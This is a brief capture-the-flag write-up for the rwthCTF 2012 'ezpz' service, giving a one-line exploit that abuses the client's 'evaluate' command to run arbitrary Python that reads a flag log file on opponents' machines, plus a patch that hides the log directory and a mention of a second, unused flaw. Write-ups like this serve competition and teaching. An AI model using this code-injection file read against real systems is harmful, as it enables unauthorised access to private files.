<h1>rwthCTF 2012 - ezpz</h1>
Flags was stored in <b>log/ezlog</b> and we could got them via <b>ezclient.py</b><br/>

<h3>Exploit:</h3>
<pre><code>
./ezclient.py 10.12.X.10 evaluate 'fl = open("/home/ezpz/log/ezlog","r"); print fl.read(); fl.close()' | egrep -o -e "\w{16}"
</code></pre>

<h3>Patch:</h3
<pre><code>
mv log `uuid`
</code></pre>
and change path in ezpz.py from log/ to generated uuid<br/>
<br/>
Also there was another vulnerability, when you could get whois information, register and make admin_check<br/>
but we didn't use it because I found it very later</br>
